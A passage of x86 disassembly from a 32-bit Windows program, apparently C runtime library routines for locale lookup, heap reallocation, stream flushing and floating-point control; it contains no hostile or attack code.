  409130:	83 ec 10             	sub    $0x10,%esp
  409133:	53                   	push   %ebx
  409134:	56                   	push   %esi
  409135:	57                   	push   %edi
  409136:	33 ff                	xor    %edi,%edi
  409138:	bb e3 00 00 00       	mov    $0xe3,%ebx
  40913d:	89 7d f4             	mov    %edi,-0xc(%ebp)
  409140:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  409143:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  409146:	c7 45 fc 55 00 00 00 	movl   $0x55,-0x4(%ebp)
  40914d:	99                   	cltd
  40914e:	2b c2                	sub    %edx,%eax
  409150:	8b c8                	mov    %eax,%ecx
  409152:	d1 f9                	sar    $1,%ecx
  409154:	6a 41                	push   $0x41
  409156:	5f                   	pop    %edi
  409157:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40915a:	8b 34 cd 70 01 41 00 	mov    0x410170(,%ecx,8),%esi
  409161:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409164:	6a 5a                	push   $0x5a
  409166:	2b ce                	sub    %esi,%ecx
  409168:	5b                   	pop    %ebx
  409169:	0f b7 04 31          	movzwl (%ecx,%esi,1),%eax
  40916d:	66 3b c7             	cmp    %di,%ax
  409170:	72 0d                	jb     0x40917f
  409172:	66 3b c3             	cmp    %bx,%ax
  409175:	77 08                	ja     0x40917f
  409177:	83 c0 20             	add    $0x20,%eax
  40917a:	0f b7 d0             	movzwl %ax,%edx
  40917d:	eb 02                	jmp    0x409181
  40917f:	8b d0                	mov    %eax,%edx
  409181:	0f b7 06             	movzwl (%esi),%eax
  409184:	66 3b c7             	cmp    %di,%ax
  409187:	72 0b                	jb     0x409194
  409189:	66 3b c3             	cmp    %bx,%ax
  40918c:	77 06                	ja     0x409194
  40918e:	83 c0 20             	add    $0x20,%eax
  409191:	0f b7 c0             	movzwl %ax,%eax
  409194:	83 c6 02             	add    $0x2,%esi
  409197:	83 6d fc 01          	subl   $0x1,-0x4(%ebp)
  40919b:	74 0a                	je     0x4091a7
  40919d:	66 85 d2             	test   %dx,%dx
  4091a0:	74 05                	je     0x4091a7
  4091a2:	66 3b d0             	cmp    %ax,%dx
  4091a5:	74 c2                	je     0x409169
  4091a7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4091aa:	8b 7d f4             	mov    -0xc(%ebp),%edi
  4091ad:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4091b0:	0f b7 c0             	movzwl %ax,%eax
  4091b3:	0f b7 d2             	movzwl %dx,%edx
  4091b6:	2b d0                	sub    %eax,%edx
  4091b8:	74 1f                	je     0x4091d9
  4091ba:	85 d2                	test   %edx,%edx
  4091bc:	79 08                	jns    0x4091c6
  4091be:	8d 59 ff             	lea    -0x1(%ecx),%ebx
  4091c1:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4091c4:	eb 06                	jmp    0x4091cc
  4091c6:	8d 79 01             	lea    0x1(%ecx),%edi
  4091c9:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4091cc:	3b fb                	cmp    %ebx,%edi
  4091ce:	0f 8e 6f ff ff ff    	jle    0x409143
  4091d4:	83 c8 ff             	or     $0xffffffff,%eax
  4091d7:	eb 07                	jmp    0x4091e0
  4091d9:	8b 04 cd 74 01 41 00 	mov    0x410174(,%ecx,8),%eax
  4091e0:	5f                   	pop    %edi
  4091e1:	5e                   	pop    %esi
  4091e2:	5b                   	pop    %ebx
  4091e3:	8b e5                	mov    %ebp,%esp
  4091e5:	5d                   	pop    %ebp
  4091e6:	c3                   	ret
  4091e7:	8b ff                	mov    %edi,%edi
  4091e9:	55                   	push   %ebp
  4091ea:	8b ec                	mov    %esp,%ebp
  4091ec:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4091f0:	74 1d                	je     0x40920f
  4091f2:	ff 75 08             	push   0x8(%ebp)
  4091f5:	e8 31 ff ff ff       	call   0x40912b
  4091fa:	59                   	pop    %ecx
  4091fb:	85 c0                	test   %eax,%eax
  4091fd:	78 10                	js     0x40920f
  4091ff:	3d e4 00 00 00       	cmp    $0xe4,%eax
  409204:	73 09                	jae    0x40920f
  409206:	8b 04 c5 50 f0 40 00 	mov    0x40f050(,%eax,8),%eax
  40920d:	5d                   	pop    %ebp
  40920e:	c3                   	ret
  40920f:	33 c0                	xor    %eax,%eax
  409211:	5d                   	pop    %ebp
  409212:	c3                   	ret
  409213:	8b ff                	mov    %edi,%edi
  409215:	55                   	push   %ebp
  409216:	8b ec                	mov    %esp,%ebp
  409218:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40921c:	75 15                	jne    0x409233
  40921e:	e8 d6 c9 ff ff       	call   0x405bf9
  409223:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  409229:	e8 0f c9 ff ff       	call   0x405b3d
  40922e:	83 c8 ff             	or     $0xffffffff,%eax
  409231:	5d                   	pop    %ebp
  409232:	c3                   	ret
  409233:	ff 75 08             	push   0x8(%ebp)
  409236:	6a 00                	push   $0x0
  409238:	ff 35 a0 51 41 00    	push   0x4151a0
  40923e:	ff 15 38 d0 40 00    	call   *0x40d038
  409244:	5d                   	pop    %ebp
  409245:	c3                   	ret
  409246:	8b ff                	mov    %edi,%edi
  409248:	55                   	push   %ebp
  409249:	8b ec                	mov    %esp,%ebp
  40924b:	57                   	push   %edi
  40924c:	8b 7d 08             	mov    0x8(%ebp),%edi
  40924f:	85 ff                	test   %edi,%edi
  409251:	75 0b                	jne    0x40925e
  409253:	ff 75 0c             	push   0xc(%ebp)
  409256:	e8 a4 e4 ff ff       	call   0x4076ff
  40925b:	59                   	pop    %ecx
  40925c:	eb 24                	jmp    0x409282
  40925e:	56                   	push   %esi
  40925f:	8b 75 0c             	mov    0xc(%ebp),%esi
  409262:	85 f6                	test   %esi,%esi
  409264:	75 09                	jne    0x40926f
  409266:	57                   	push   %edi
  409267:	e8 fd c9 ff ff       	call   0x405c69
  40926c:	59                   	pop    %ecx
  40926d:	eb 10                	jmp    0x40927f
  40926f:	83 fe e0             	cmp    $0xffffffe0,%esi
  409272:	76 25                	jbe    0x409299
  409274:	e8 80 c9 ff ff       	call   0x405bf9
  409279:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  40927f:	33 c0                	xor    %eax,%eax
  409281:	5e                   	pop    %esi
  409282:	5f                   	pop    %edi
  409283:	5d                   	pop    %ebp
  409284:	c3                   	ret
  409285:	e8 69 ba ff ff       	call   0x404cf3
  40928a:	85 c0                	test   %eax,%eax
  40928c:	74 e6                	je     0x409274
  40928e:	56                   	push   %esi
  40928f:	e8 fe ea ff ff       	call   0x407d92
  409294:	59                   	pop    %ecx
  409295:	85 c0                	test   %eax,%eax
  409297:	74 db                	je     0x409274
  409299:	56                   	push   %esi
  40929a:	57                   	push   %edi
  40929b:	6a 00                	push   $0x0
  40929d:	ff 35 a0 51 41 00    	push   0x4151a0
  4092a3:	ff 15 34 d0 40 00    	call   *0x40d034
  4092a9:	85 c0                	test   %eax,%eax
  4092ab:	74 d8                	je     0x409285
  4092ad:	eb d2                	jmp    0x409281
  4092af:	8b ff                	mov    %edi,%edi
  4092b1:	55                   	push   %ebp
  4092b2:	8b ec                	mov    %esp,%ebp
  4092b4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4092b7:	83 f9 fe             	cmp    $0xfffffffe,%ecx
  4092ba:	75 0d                	jne    0x4092c9
  4092bc:	e8 38 c9 ff ff       	call   0x405bf9
  4092c1:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4092c7:	eb 38                	jmp    0x409301
  4092c9:	85 c9                	test   %ecx,%ecx
  4092cb:	78 24                	js     0x4092f1
  4092cd:	3b 0d 90 51 41 00    	cmp    0x415190,%ecx
  4092d3:	73 1c                	jae    0x4092f1
  4092d5:	8b c1                	mov    %ecx,%eax
  4092d7:	83 e1 3f             	and    $0x3f,%ecx
  4092da:	c1 f8 06             	sar    $0x6,%eax
  4092dd:	6b c9 30             	imul   $0x30,%ecx,%ecx
  4092e0:	8b 04 85 90 4f 41 00 	mov    0x414f90(,%eax,4),%eax
  4092e7:	0f b6 44 08 28       	movzbl 0x28(%eax,%ecx,1),%eax
  4092ec:	83 e0 40             	and    $0x40,%eax
  4092ef:	5d                   	pop    %ebp
  4092f0:	c3                   	ret
  4092f1:	e8 03 c9 ff ff       	call   0x405bf9
  4092f6:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4092fc:	e8 3c c8 ff ff       	call   0x405b3d
  409301:	33 c0                	xor    %eax,%eax
  409303:	5d                   	pop    %ebp
  409304:	c3                   	ret
  409305:	8b ff                	mov    %edi,%edi
  409307:	55                   	push   %ebp
  409308:	8b ec                	mov    %esp,%ebp
  40930a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40930d:	56                   	push   %esi
  40930e:	8d 71 0c             	lea    0xc(%ecx),%esi
  409311:	8b 06                	mov    (%esi),%eax
  409313:	24 03                	and    $0x3,%al
  409315:	3c 02                	cmp    $0x2,%al
  409317:	74 04                	je     0x40931d
  409319:	33 c0                	xor    %eax,%eax
  40931b:	eb 4b                	jmp    0x409368
  40931d:	8b 06                	mov    (%esi),%eax
  40931f:	a8 c0                	test   $0xc0,%al
  409321:	74 f6                	je     0x409319
  409323:	8b 41 04             	mov    0x4(%ecx),%eax
  409326:	57                   	push   %edi
  409327:	8b 39                	mov    (%ecx),%edi
  409329:	2b f8                	sub    %eax,%edi
  40932b:	89 01                	mov    %eax,(%ecx)
  40932d:	83 61 08 00          	andl   $0x0,0x8(%ecx)
  409331:	85 ff                	test   %edi,%edi
  409333:	7e 30                	jle    0x409365
  409335:	57                   	push   %edi
  409336:	50                   	push   %eax
  409337:	51                   	push   %ecx
  409338:	e8 ee f3 ff ff       	call   0x40872b
  40933d:	59                   	pop    %ecx
  40933e:	50                   	push   %eax
  40933f:	e8 63 0a 00 00       	call   0x409da7
  409344:	83 c4 0c             	add    $0xc,%esp
  409347:	3b f8                	cmp    %eax,%edi
  409349:	74 0b                	je     0x409356
  40934b:	6a 10                	push   $0x10
  40934d:	58                   	pop    %eax
  40934e:	f0 09 06             	lock or %eax,(%esi)
  409351:	83 c8 ff             	or     $0xffffffff,%eax
  409354:	eb 11                	jmp    0x409367
  409356:	8b 06                	mov    (%esi),%eax
  409358:	c1 e8 02             	shr    $0x2,%eax
  40935b:	a8 01                	test   $0x1,%al
  40935d:	74 06                	je     0x409365
  40935f:	6a fd                	push   $0xfffffffd
  409361:	58                   	pop    %eax
  409362:	f0 21 06             	lock and %eax,(%esi)
  409365:	33 c0                	xor    %eax,%eax
  409367:	5f                   	pop    %edi
  409368:	5e                   	pop    %esi
  409369:	5d                   	pop    %ebp
  40936a:	c3                   	ret
  40936b:	8b ff                	mov    %edi,%edi
  40936d:	55                   	push   %ebp
  40936e:	8b ec                	mov    %esp,%ebp
  409370:	56                   	push   %esi
  409371:	8b 75 08             	mov    0x8(%ebp),%esi
  409374:	85 f6                	test   %esi,%esi
  409376:	75 09                	jne    0x409381
  409378:	56                   	push   %esi
  409379:	e8 3d 00 00 00       	call   0x4093bb
  40937e:	59                   	pop    %ecx
  40937f:	eb 2e                	jmp    0x4093af
  409381:	56                   	push   %esi
  409382:	e8 7e ff ff ff       	call   0x409305
  409387:	59                   	pop    %ecx
  409388:	85 c0                	test   %eax,%eax
  40938a:	74 05                	je     0x409391
  40938c:	83 c8 ff             	or     $0xffffffff,%eax
  40938f:	eb 1e                	jmp    0x4093af
  409391:	8b 46 0c             	mov    0xc(%esi),%eax
  409394:	c1 e8 0b             	shr    $0xb,%eax
  409397:	a8 01                	test   $0x1,%al
  409399:	74 12                	je     0x4093ad
  40939b:	56                   	push   %esi
  40939c:	e8 8a f3 ff ff       	call   0x40872b
  4093a1:	50                   	push   %eax
  4093a2:	e8 01 04 00 00       	call   0x4097a8
  4093a7:	59                   	pop    %ecx
  4093a8:	59                   	pop    %ecx
  4093a9:	85 c0                	test   %eax,%eax
  4093ab:	75 df                	jne    0x40938c
  4093ad:	33 c0                	xor    %eax,%eax
  4093af:	5e                   	pop    %esi
  4093b0:	5d                   	pop    %ebp
  4093b1:	c3                   	ret
  4093b2:	6a 01                	push   $0x1
  4093b4:	e8 02 00 00 00       	call   0x4093bb
  4093b9:	59                   	pop    %ecx
  4093ba:	c3                   	ret
  4093bb:	6a 1c                	push   $0x1c
  4093bd:	68 c0 28 41 00       	push   $0x4128c0
  4093c2:	e8 d9 87 ff ff       	call   0x401ba0
  4093c7:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  4093cb:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  4093cf:	6a 08                	push   $0x8
  4093d1:	e8 0c d7 ff ff       	call   0x406ae2
  4093d6:	59                   	pop    %ecx
  4093d7:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4093db:	8b 35 c4 51 41 00    	mov    0x4151c4,%esi
  4093e1:	a1 c0 51 41 00       	mov    0x4151c0,%eax
  4093e6:	8d 04 86             	lea    (%esi,%eax,4),%eax
  4093e9:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4093ec:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4093ef:	89 75 e0             	mov    %esi,-0x20(%ebp)
  4093f2:	3b f0                	cmp    %eax,%esi
  4093f4:	74 74                	je     0x40946a
  4093f6:	8b 3e                	mov    (%esi),%edi
  4093f8:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4093fb:	85 ff                	test   %edi,%edi
  4093fd:	74 56                	je     0x409455
  4093ff:	57                   	push   %edi
  409400:	e8 60 f4 ff ff       	call   0x408865
  409405:	59                   	pop    %ecx
  409406:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40940d:	8b 47 0c             	mov    0xc(%edi),%eax
  409410:	c1 e8 0d             	shr    $0xd,%eax
  409413:	a8 01                	test   $0x1,%al
  409415:	74 32                	je     0x409449
  409417:	83 fb 01             	cmp    $0x1,%ebx
  40941a:	75 11                	jne    0x40942d
  40941c:	57                   	push   %edi
  40941d:	e8 49 ff ff ff       	call   0x40936b
  409422:	59                   	pop    %ecx
  409423:	83 f8 ff             	cmp    $0xffffffff,%eax
  409426:	74 21                	je     0x409449
  409428:	ff 45 e4             	incl   -0x1c(%ebp)
  40942b:	eb 1c                	jmp    0x409449
  40942d:	85 db                	test   %ebx,%ebx
  40942f:	75 18                	jne    0x409449
  409431:	8b 47 0c             	mov    0xc(%edi),%eax
  409434:	d1 e8                	shr    $1,%eax
  409436:	a8 01                	test   $0x1,%al
  409438:	74 0f                	je     0x409449
  40943a:	57                   	push   %edi
  40943b:	e8 2b ff ff ff       	call   0x40936b
  409440:	59                   	pop    %ecx
  409441:	83 f8 ff             	cmp    $0xffffffff,%eax
  409444:	75 03                	jne    0x409449
  409446:	09 45 dc             	or     %eax,-0x24(%ebp)
  409449:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40944d:	e8 0e 00 00 00       	call   0x409460
  409452:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  409455:	83 c6 04             	add    $0x4,%esi
  409458:	eb 95                	jmp    0x4093ef
  40945a:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40945d:	8b 75 e0             	mov    -0x20(%ebp),%esi
  409460:	ff 75 d8             	push   -0x28(%ebp)
  409463:	e8 11 f4 ff ff       	call   0x408879
  409468:	59                   	pop    %ecx
  409469:	c3                   	ret
  40946a:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409471:	e8 14 00 00 00       	call   0x40948a
  409476:	83 fb 01             	cmp    $0x1,%ebx
  409479:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40947c:	74 03                	je     0x409481
  40947e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  409481:	e8 6a 87 ff ff       	call   0x401bf0
  409486:	c3                   	ret
  409487:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40948a:	6a 08                	push   $0x8
  40948c:	e8 99 d6 ff ff       	call   0x406b2a
  409491:	59                   	pop    %ecx
  409492:	c3                   	ret
  409493:	6a 08                	push   $0x8
  409495:	68 e8 28 41 00       	push   $0x4128e8
  40949a:	e8 01 87 ff ff       	call   0x401ba0
  40949f:	83 3d 34 4b 41 00 01 	cmpl   $0x1,0x414b34
  4094a6:	7c 5b                	jl     0x409503
  4094a8:	8b 45 08             	mov    0x8(%ebp),%eax
  4094ab:	a8 40                	test   $0x40,%al
  4094ad:	74 4a                	je     0x4094f9
  4094af:	83 3d 50 47 41 00 00 	cmpl   $0x0,0x414750
  4094b6:	74 41                	je     0x4094f9
  4094b8:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4094bc:	0f ae 55 08          	ldmxcsr 0x8(%ebp)
  4094c0:	eb 2e                	jmp    0x4094f0
  4094c2:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4094c5:	8b 00                	mov    (%eax),%eax
  4094c7:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
  4094cd:	74 0b                	je     0x4094da
  4094cf:	81 38 1d 00 00 c0    	cmpl   $0xc000001d,(%eax)
  4094d5:	74 03                	je     0x4094da
  4094d7:	33 c0                	xor    %eax,%eax
  4094d9:	c3                   	ret
  4094da:	33 c0                	xor    %eax,%eax
  4094dc:	40                   	inc    %eax
  4094dd:	c3                   	ret
  4094de:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4094e1:	83 25 50 47 41 00 00 	andl   $0x0,0x414750
  4094e8:	83 65 08 bf          	andl   $0xffffffbf,0x8(%ebp)
  4094ec:	0f ae 55 08          	ldmxcsr 0x8(%ebp)
  4094f0:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4094f7:	eb 0a                	jmp    0x409503
  4094f9:	83 e0 bf             	and    $0xffffffbf,%eax
  4094fc:	89 45 08             	mov    %eax,0x8(%ebp)
  4094ff:	0f ae 55 08          	ldmxcsr 0x8(%ebp)
  409503:	e8 e8 86 ff ff       	call   0x401bf0
  409508:	c3                   	ret
  409509:	8b ff                	mov    %edi,%edi
  40950b:	55                   	push   %ebp
  40950c:	8b ec                	mov    %esp,%ebp
  40950e:	51                   	push   %ecx
  40950f:	dd 7d fc             	fnstsw -0x4(%ebp)
  409512:	db e2                	fnclex
  409514:	0f bf 45 fc          	movswl -0x4(%ebp),%eax
  409518:	8b e5                	mov    %ebp,%esp
  40951a:	5d                   	pop    %ebp
  40951b:	c3                   	ret
  40951c:	8b ff                	mov    %edi,%edi
  40951e:	55                   	push   %ebp
  40951f:	8b ec                	mov    %esp,%ebp
  409521:	51                   	push   %ecx
  409522:	51                   	push   %ecx
  409523:	9b d9 7d fc          	fstcw  -0x4(%ebp)
  409527:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40952a:	8b 45 08             	mov    0x8(%ebp),%eax
  40952d:	f7 d1                	not    %ecx
  40952f:	66 23 4d fc          	and    -0x4(%ebp),%cx
  409533:	23 45 0c             	and    0xc(%ebp),%eax
  409536:	66 0b c8             	or     %ax,%cx
  409539:	66 89 4d f8          	mov    %cx,-0x8(%ebp)
  40953d:	d9 6d f8             	fldcw  -0x8(%ebp)
  409540:	0f bf 45 fc          	movswl -0x4(%ebp),%eax
  409544:	8b e5                	mov    %ebp,%esp
  409546:	5d                   	pop    %ebp
  409547:	c3                   	ret
  409548:	8b ff                	mov    %edi,%edi
  40954a:	55                   	push   %ebp
  40954b:	8b ec                	mov    %esp,%ebp
  40954d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409550:	83 ec 0c             	sub    $0xc,%esp
  409553:	f6 c1 01             	test   $0x1,%cl
  409556:	74 0a                	je     0x409562
  409558:	db 2d c0 10 41 00    	fldt   0x4110c0
  40955e:	db 5d fc             	fistpl -0x4(%ebp)
  409561:	9b                   	fwait
  409562:	f6 c1 08             	test   $0x8,%cl
  409565:	74 10                	je     0x409577
  409567:	9b df e0             	fstsw  %ax
  40956a:	db 2d c0 10 41 00    	fldt   0x4110c0
  409570:	dd 5d f4             	fstpl  -0xc(%ebp)
  409573:	9b 9b df e0          	fstsw  %ax
  409577:	f6 c1 10             	test   $0x10,%cl
  40957a:	74 0a                	je     0x409586
  40957c:	db 2d cc 10 41 00    	fldt   0x4110cc
  409582:	dd 5d f4             	fstpl  -0xc(%ebp)
  409585:	9b                   	fwait
  409586:	f6 c1 04             	test   $0x4,%cl
  409589:	74 09                	je     0x409594
  40958b:	d9 ee                	fldz
  40958d:	d9 e8                	fld1
  40958f:	de f1                	fdivp  %st,%st(1)
  409591:	dd d8                	fstp   %st(0)
  409593:	9b                   	fwait
  409594:	f6 c1 20             	test   $0x20,%cl
  409597:	74 06                	je     0x40959f
  409599:	d9 eb                	fldpi
  40959b:	dd 5d f4             	fstpl  -0xc(%ebp)
  40959e:	9b                   	fwait
  40959f:	8b e5                	mov    %ebp,%esp
  4095a1:	5d                   	pop    %ebp
  4095a2:	c3                   	ret
  4095a3:	8b ff                	mov    %edi,%edi
  4095a5:	55                   	push   %ebp
  4095a6:	8b ec                	mov    %esp,%ebp
  4095a8:	51                   	push   %ecx
  4095a9:	9b dd 7d fc          	fstsw  -0x4(%ebp)
  4095ad:	0f bf 45 fc          	movswl -0x4(%ebp),%eax
  4095b1:	8b e5                	mov    %ebp,%esp
  4095b3:	5d                   	pop    %ebp
  4095b4:	c3                   	ret
  4095b5:	8b ff                	mov    %edi,%edi
  4095b7:	55                   	push   %ebp
  4095b8:	8b ec                	mov    %esp,%ebp
  4095ba:	83 ec 10             	sub    $0x10,%esp
  4095bd:	ff 75 0c             	push   0xc(%ebp)
  4095c0:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4095c3:	e8 b5 bd ff ff       	call   0x40537d
  4095c8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4095cb:	0f b6 4d 08          	movzbl 0x8(%ebp),%ecx
  4095cf:	8b 00                	mov    (%eax),%eax
  4095d1:	0f b7 04 48          	movzwl (%eax,%ecx,2),%eax
  4095d5:	25 00 80 00 00       	and    $0x8000,%eax
  4095da:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  4095de:	74 0a                	je     0x4095ea
  4095e0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4095e3:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  4095ea:	8b e5                	mov    %ebp,%esp
  4095ec:	5d                   	pop    %ebp
  4095ed:	c3                   	ret
  4095ee:	6a 10                	push   $0x10
  4095f0:	68 08 29 41 00       	push   $0x412908
  4095f5:	e8 a6 85 ff ff       	call   0x401ba0
  4095fa:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  4095fe:	6a 08                	push   $0x8
  409600:	e8 dd d4 ff ff       	call   0x406ae2
  409605:	59                   	pop    %ecx
  409606:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40960a:	6a 03                	push   $0x3
  40960c:	5e                   	pop    %esi
  40960d:	89 75 e0             	mov    %esi,-0x20(%ebp)
  409610:	3b 35 c0 51 41 00    	cmp    0x4151c0,%esi
  409616:	74 58                	je     0x409670
  409618:	a1 c4 51 41 00       	mov    0x4151c4,%eax
  40961d:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  409620:	85 c0                	test   %eax,%eax
  409622:	74 49                	je     0x40966d
  409624:	8b 40 0c             	mov    0xc(%eax),%eax
  409627:	c1 e8 0d             	shr    $0xd,%eax
  40962a:	a8 01                	test   $0x1,%al
  40962c:	74 16                	je     0x409644
  40962e:	a1 c4 51 41 00       	mov    0x4151c4,%eax
  409633:	ff 34 b0             	push   (%eax,%esi,4)
  409636:	e8 e1 0d 00 00       	call   0x40a41c
  40963b:	59                   	pop    %ecx
  40963c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40963f:	74 03                	je     0x409644
  409641:	ff 45 e4             	incl   -0x1c(%ebp)
  409644:	a1 c4 51 41 00       	mov    0x4151c4,%eax
  409649:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  40964c:	83 c0 20             	add    $0x20,%eax
  40964f:	50                   	push   %eax
  409650:	ff 15 88 d0 40 00    	call   *0x40d088
  409656:	a1 c4 51 41 00       	mov    0x4151c4,%eax
  40965b:	ff 34 b0             	push   (%eax,%esi,4)
  40965e:	e8 06 c6 ff ff       	call   0x405c69
  409663:	59                   	pop    %ecx
  409664:	a1 c4 51 41 00       	mov    0x4151c4,%eax
  409669:	83 24 b0 00          	andl   $0x0,(%eax,%esi,4)
  40966d:	46                   	inc    %esi
  40966e:	eb 9d                	jmp    0x40960d
  409670:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409677:	e8 09 00 00 00       	call   0x409685
  40967c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40967f:	e8 6c 85 ff ff       	call   0x401bf0
  409684:	c3                   	ret
  409685:	6a 08                	push   $0x8
  409687:	e8 9e d4 ff ff       	call   0x406b2a
  40968c:	59                   	pop    %ecx
  40968d:	c3                   	ret
  40968e:	8b ff                	mov    %edi,%edi
  409690:	55                   	push   %ebp
  409691:	8b ec                	mov    %esp,%ebp
  409693:	56                   	push   %esi
  409694:	8b 75 08             	mov    0x8(%ebp),%esi
  409697:	57                   	push   %edi
  409698:	8d 7e 0c             	lea    0xc(%esi),%edi
  40969b:	8b 07                	mov    (%edi),%eax
  40969d:	c1 e8 0d             	shr    $0xd,%eax
  4096a0:	a8 01                	test   $0x1,%al
  4096a2:	74 24                	je     0x4096c8
  4096a4:	8b 07                	mov    (%edi),%eax
  4096a6:	c1 e8 06             	shr    $0x6,%eax
  4096a9:	a8 01                	test   $0x1,%al
  4096ab:	74 1b                	je     0x4096c8
  4096ad:	ff 76 04             	push   0x4(%esi)
  4096b0:	e8 b4 c5 ff ff       	call   0x405c69
  4096b5:	59                   	pop    %ecx
  4096b6:	b8 bf fe ff ff       	mov    $0xfffffebf,%eax
  4096bb:	f0 21 07             	lock and %eax,(%edi)
  4096be:	33 c0                	xor    %eax,%eax
  4096c0:	89 46 04             	mov    %eax,0x4(%esi)
  4096c3:	89 06                	mov    %eax,(%esi)
  4096c5:	89 46 08             	mov    %eax,0x8(%esi)
  4096c8:	5f                   	pop    %edi
  4096c9:	5e                   	pop    %esi
  4096ca:	5d                   	pop    %ebp
  4096cb:	c3                   	ret
  4096cc:	8b ff                	mov    %edi,%edi
  4096ce:	55                   	push   %ebp
  4096cf:	8b ec                	mov    %esp,%ebp
  4096d1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4096d4:	33 c0                	xor    %eax,%eax
  4096d6:	38 01                	cmp    %al,(%ecx)
  4096d8:	74 0c                	je     0x4096e6
  4096da:	3b 45 0c             	cmp    0xc(%ebp),%eax
  4096dd:	74 07                	je     0x4096e6
  4096df:	40                   	inc    %eax
  4096e0:	80 3c 08 00          	cmpb   $0x0,(%eax,%ecx,1)
  4096e4:	75 f4                	jne    0x4096da
  4096e6:	5d                   	pop    %ebp
  4096e7:	c3                   	ret
  4096e8:	6a 0c                	push   $0xc
  4096ea:	68 28 29 41 00       	push   $0x412928
  4096ef:	e8 ac 84 ff ff       	call   0x401ba0
  4096f4:	33 f6                	xor    %esi,%esi
  4096f6:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4096f9:	8b 45 08             	mov    0x8(%ebp),%eax
  4096fc:	ff 30                	push   (%eax)
  4096fe:	e8 20 da ff ff       	call   0x407123
  409703:	59                   	pop    %ecx
  409704:	89 75 fc             	mov    %esi,-0x4(%ebp)
  409707:	8b 45 0c             	mov    0xc(%ebp),%eax
  40970a:	8b 00                	mov    (%eax),%eax
  40970c:	8b 38                	mov    (%eax),%edi
  40970e:	8b d7                	mov    %edi,%edx
  409710:	c1 fa 06             	sar    $0x6,%edx
  409713:	8b c7                	mov    %edi,%eax
  409715:	83 e0 3f             	and    $0x3f,%eax
  409718:	6b c8 30             	imul   $0x30,%eax,%ecx
  40971b:	8b 04 95 90 4f 41 00 	mov    0x414f90(,%edx,4),%eax
  409722:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  409727:	74 21                	je     0x40974a
  409729:	57                   	push   %edi
  40972a:	e8 cb da ff ff       	call   0x4071fa
  40972f:	59                   	pop    %ecx
  409730:	50                   	push   %eax
  409731:	ff 15 30 d0 40 00    	call   *0x40d030
  409737:	85 c0                	test   %eax,%eax
  409739:	75 1d                	jne    0x409758
  40973b:	e8 a6 c4 ff ff       	call   0x405be6
  409740:	8b f0                	mov    %eax,%esi
  409742:	ff 15 74 d0 40 00    	call   *0x40d074
  409748:	89 06                	mov    %eax,(%esi)
  40974a:	e8 aa c4 ff ff       	call   0x405bf9
  40974f:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  409755:	83 ce ff             	or     $0xffffffff,%esi
  409758:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40975b:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409762:	e8 0d 00 00 00       	call   0x409774
  409767:	8b c6                	mov    %esi,%eax
  409769:	e8 82 84 ff ff       	call   0x401bf0
  40976e:	c2 0c 00             	ret    $0xc
  409771:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  409774:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409777:	ff 31                	push   (%ecx)
  409779:	e8 c8 d9 ff ff       	call   0x407146
  40977e:	59                   	pop    %ecx
  40977f:	c3                   	ret
  409780:	8b ff                	mov    %edi,%edi
  409782:	55                   	push   %ebp
  409783:	8b ec                	mov    %esp,%ebp
  409785:	83 ec 0c             	sub    $0xc,%esp
  409788:	8b 45 08             	mov    0x8(%ebp),%eax
  40978b:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  40978e:	89 45 f8             	mov    %eax,-0x8(%ebp)
